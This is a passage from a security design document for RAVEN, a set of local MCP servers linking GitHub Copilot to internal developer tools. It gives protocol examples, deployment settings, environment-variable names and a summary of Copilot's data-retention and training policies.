| **OWASP Top 10 — Cryptographic Failures** | Credentials never in logs, responses, or code. TLS for all network traffic. |
| **OWASP Top 10 — SSRF** | No tool accepts an arbitrary URL as a parameter. Endpoints are fixed by configuration (`~/.raven/.env`), not chosen by the AI; the `jarvis-mcp` proxy forwards only to its configured Jarvis endpoint (§11.3). |
| **Least Privilege** | Read-only by default (121 of 181 local tools; see [TOOL_INVENTORY.md](TOOL_INVENTORY.md)). Jenkins mutations remain subject to controller authorization and protected-file/secret-source controls; Artifactory writes are confined to artifacts, properties, and protected transfer directories. SSH remains read-only. |
| **GitHub Copilot Business DPA** | Zero data retention. Prompts and responses not stored or used for training. |

---

## Appendix A — MCP Protocol Specification

### A.1 Protocol Overview

MCP uses JSON-RPC 2.0 over stdio (stdin/stdout). Each message is a JSON object with a method name and parameters.

### A.2 Tool Registration

At startup, the server sends a capabilities message listing all available tools:

```json
{
  "tools": [
    {
      "name": "search_issues",
      "description": "Search Jira issues using JQL",
      "inputSchema": {
        "type": "object",
        "properties": {
          "jql": { "type": "string" },
          "maxResults": { "type": "number", "minimum": 1, "maximum": 50 }
        },
        "required": ["jql"]
      }
    }
  ]
}
```

### A.3 Tool Invocation

The AI client sends a tool call:

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "search_issues",
    "arguments": { "jql": "project = DEMO AND type = Bug", "maxResults": 10 }
  },
  "id": 1
}
```

### A.4 Tool Response

The server returns a text result:

```json
{
  "jsonrpc": "2.0",
  "result": {
    "content": [
      {
        "type": "text",
        "text": "Found 3 bugs in DEMO:\n\n1. **DEMO-456** — NullPointerException in ExhibitService (Person-1, Updated 2 days ago)..."
      }
    ]
  },
  "id": 1
}
```

Note: Personal names are already replaced with `Person-N` labels. No credentials appear anywhere in this response.

---

## Appendix B — Deployment Configuration

### B.1 VS Code / GitHub Copilot MCP Configuration

Each MCP server is launched as a local Node.js process:

```json
{
  "mcpServers": {
    "jira": {
      "command": "node",
      "args": ["<path>/packages/jira-mcp/dist/index.js"]
    },
    "confluence": {
      "command": "node",
      "args": ["<path>/packages/confluence-mcp/dist/index.js"]
    }
  }
}
```

**Security properties of this configuration:**

- No network ports exposed (stdio only)
- No environment variables containing secrets in the config file
- Each server is an isolated process with its own memory space
- Credentials loaded from `~/.raven/.env` at runtime, not from the config

### B.2 Required Environment Variables

Stored in `~/.raven/.env` (not committed to version control). The table below lists the core variables; the **complete, code-derived env-var reference** (every server, required/optional, sensitive flags) lives in [TOOL_INVENTORY.md](TOOL_INVENTORY.md#environment-variables):

| Variable | Purpose | Used By |
|----------|---------|---------|
| `ATLASSIAN_BASE_URL` | Internal Atlassian URL | Jira, Confluence, Bitbucket, Assets |
| `ATLASSIAN_EMAIL` | User's gov.bc.ca email | Basic Auth |
| `ATLASSIAN_PASSWORD` | User's IDIR password | Basic Auth |
| `RAVEN_SCRUB_PI` | Enable PI scrubbing (`true`/`1`) | All servers |
| `SERVER_A_PASSWORD` | SSH and sudo password for servers | Server Monitor, IMIS |
| `ADO_BASE_URL` | Azure DevOps base URL | Azure DevOps |
| `ADO_DEFAULT_COLLECTION` | Default Azure DevOps collection | Azure DevOps |
| `ADO_PAT` | Azure DevOps personal access token | Azure DevOps |
| `ADO_DEFAULT_PROJECT` | Default Azure DevOps project | Azure DevOps |
| `JARVIS_TOKEN` | Jarvis API token | Jarvis |
| `SONARQUBE_URL` | SonarQube base URL | Sonar |
| `SONARQUBE_TOKEN` | SonarQube user token | Sonar |
| `SONAR_SCANNER_BIN` | Optional path to the local sonar-scanner binary | Sonar (`sonar_run_scan`) |
| `JENKINS_URL` / `JENKINS_BASE_URL` | HTTPS Jenkins controller base URL; HTTP is rejected before authentication | Jenkins |
| `JENKINS_USER` | Optional dedicated Jenkins username | Jenkins |
| `JENKINS_TOKEN` / `JENKINS_API_TOKEN` / `JENKINS_PASSWORD` | Optional dedicated Jenkins token/password | Jenkins |
| `RAVEN_JENKINS_CONFIG_DIR` / `RAVEN_JENKINS_DOWNLOAD_DIR` / `RAVEN_JENKINS_SECRET_DIR` | Protected local Jenkins workflow directories | Jenkins |
| `RFCBUDDY_URL` | RFC Buddy base URL | RFC Buddy |
| `RFCBUDDY_PAT` | Personal Access Token (bearer token) for API | RFC Buddy |
| `ARTIFACTORY_URL` | HTTPS Artifactory base URL | Artifactory |
| `ARTIFACTORY_EMAIL` | User's gov.bc.ca email | Artifactory Basic Auth |
| `ARTIFACTORY_PASSWORD` | User's IDIR password | Artifactory Basic Auth |
| `RAVEN_ARTIFACTORY_UPLOAD_DIR` / `RAVEN_ARTIFACTORY_DOWNLOAD_DIR` | Protected transfer roots | Artifactory |
| `RAVEN_ARTIFACTORY_MAX_TRANSFER_BYTES` | Maximum artifact transfer size | Artifactory |
| `RAVEN_ARTIFACTORY_DOWNLOAD_TIMEOUT_MS` | Maximum artifact download duration in milliseconds | Artifactory |
| `RAVEN_ARTIFACTORY_DOWNLOAD_REDIRECT_HOSTS` | Approved HTTPS storage hosts for credential-free direct downloads | Artifactory |

### B.3 Technology Stack

| Component | Technology | Version |
|-----------|-----------|---------|
| Runtime | Node.js | >= 20.0.0 |
| Language | TypeScript | 5.9+ |
| MCP SDK | `@modelcontextprotocol/sdk` | 1.12+ |
| Schema validation | Zod | 3.24+ |
| Build system | TypeScript Project References | — |
| Package manager | npm workspaces | — |
| PI scrubbing | Custom (regex + name mapping) | — |
| HTML ↔ Markdown | Turndown + markdown-it | — |

---

## Appendix C — GitHub Copilot Zero Data Retention Policy Reference

This appendix summarizes GitHub Copilot's data retention and privacy commitments as documented by GitHub, Microsoft, and independent analysis. These policies are central to RAVEN's security posture: even if enterprise data passes through an AI model during processing, it is not retained, stored, or used for training.

### C.1 No Training on Customer Data

GitHub does not use data from Copilot Business or Enterprise customers to train models. This applies to both GitHub's own models and third-party models (Anthropic, Google, OpenAI, xAI). As stated in the GitHub Copilot Trust Center:

> "No. GitHub uses neither Copilot Business nor Enterprise data to train the GitHub model."

This prohibition extends to all model providers. GitHub maintains contractual agreements with each provider ensuring customer data is excluded from training.

### C.2 Data Retention by Access Method (Business/Enterprise Plans)

**IDE access (Chat and Code Completions):**

| Data Type | Retention |
|-----------|-----------|
| Prompts and suggestions | **Not retained** |
| User engagement data | 2 years |
| Feedback data | As long as needed for its intended purpose |

**Other GitHub Copilot access and use:**

| Data Type | Retention |
|-----------|-----------|
| Prompts and suggestions | **28 days** |
| User engagement data | 2 years |
| Feedback data | As long as needed for its intended purpose |

For Copilot Coding Agent, session logs are retained for the life of the account to provide the service.

Since RAVEN MCP tools are invoked through IDE-based Copilot Chat, the **"not retained"** policy applies to all prompts and tool responses.

### C.3 Zero Data Retention Agreements by Model Provider

GitHub maintains zero data retention (ZDR) agreements with each AI model provider used in Copilot. The specifics by provider:

**OpenAI:**
- GitHub maintains a zero data retention agreement with OpenAI
- OpenAI commits: "We do not train models on customer business data"
- Data processing follows OpenAI's enterprise privacy commitments

**Anthropic (Claude models, including Claude Opus 4.6 used by RAVEN):**
- GitHub maintains a zero data retention agreement with Anthropic for all generally available Anthropic features in GitHub Copilot
- Amazon Bedrock (used to host some Anthropic models) commits: "Amazon Bedrock doesn't store or log your prompts and completions. Amazon Bedrock doesn't use your prompts and completions to train any AWS models and doesn't distribute them to third parties."
- Google Cloud (also used to host Anthropic models) commits to not training on GitHub data as part of their service terms; GitHub is not subject to prompt logging for abuse monitoring

**Google (Gemini models):**
- Google commits: "Gemini doesn't use your prompts, or its responses, as data to train its models"

**xAI (Grok models):**
- xAI operates under a zero data retention API policy. User content (inputs and outputs):
  - Will **not** be logged for any purpose, including human review
  - Will **not** be saved to disk or retained in any form, including as metadata
  - Will **not** be accessible by xAI personnel
  - Will **not** be used for model training
  - Will **only** exist temporarily in RAM for the minimum time required to process and respond
  - Will be **immediately deleted** from memory once the response is delivered

### C.4 Content Filtering and Safety

All input requests and output responses — regardless of which model processes them — pass through GitHub Copilot's content filtering systems. These include:

- **Public code matching filters** — detect and flag suggestions that closely match public code (when enabled)
- **Harmful content detection** — block offensive, toxic, or dangerous content
- **Pre-inference screening** — prompts pass through a GitHub proxy hosted in Microsoft Azure that checks for toxic language, relevance, and jailbreak attempts before reaching the model
- **Vulnerability protection** — blocks insecure coding patterns like hardcoded credentials or SQL injections in real time

### C.5 Compliance Certifications

GitHub Copilot holds the following compliance certifications:

- **SOC 1 Type 2** — Assurance over internal controls for financial reporting
- **SOC 2 Type 2** — In-depth report covering Security, Availability, Processing Integrity, Confidentiality, and Privacy
- **SOC 3** — General-use version of SOC 2 with executive-level assurance
- **ISO/IEC 27001:2013** — Certification for a formal Information Security Management System (ISMS)
- **CSA STAR Level 2** — Third-party attestation combining ISO 27001 or SOC 2 with Cloud Control Matrix (CCM) requirements
- **TISAX** — Trusted Information Security Assessment Exchange

### C.6 MCP Server Registry and Control

GitHub now offers an MCP registry feature that allows organizations to restrict access to only trusted MCP servers. This provides an additional layer of organizational control — administrators can whitelist approved MCP servers (such as RAVEN) and block unauthorized ones.

### C.7 What This Means for RAVEN

Combining RAVEN's security controls with GitHub Copilot's data policies creates a defence-in-depth model:

1. **Layer 1 — PI Scrubbing (RAVEN):** Personal information is anonymized before it leaves the local MCP server
2. **Layer 2 — Content Filtering (GitHub):** Prompts pass through safety filters before reaching the model
3. **Layer 3 — Zero Data Retention (Model Provider):** Data exists only in RAM during processing and is immediately discarded
4. **Layer 4 — No Training (Contractual):** Customer data is contractually excluded from model training by all providers
5. **Layer 5 — IDE Access Policy (GitHub):** Prompts and suggestions from IDE-based Chat are not retained at all

The result: even in the brief, transient moment when data is processed by the LLM, personal information has already been removed. After the response is delivered, nothing persists anywhere in the chain.

### References

1. Microsoft Tech Community — "Demystifying GitHub Copilot Security Controls: Easing Concerns for Organizational Adoption"  
   https://techcommunity.microsoft.com/blog/azuredevcommunityblog/demystifying-github-copilot-security-controls-easing-concerns-for-organizational/4468193

2. GitHub Docs — "Hosting of Models for GitHub Copilot Chat"  
   https://docs.github.com/en/copilot/reference/ai-models/model-hosting

3. LinkedIn — "Zero Data Retention in Copilot: What You Need to Know"  
   https://www.linkedin.com/pulse/zero-data-retention-copilot-what-you-need-know-your-shardorn-3soze

4. GitHub Copilot Trust Center  
   https://resources.github.com/copilot-trust-center/

5. GitHub — "How GitHub Copilot Handles Data"  
   https://resources.github.com/learn/pathways/copilot/essentials/how-github-copilot-handles-data/

---

*Document prepared by the Epsilon team at Connected Services BC. For questions, contact the NR Sector Digital Services team.*
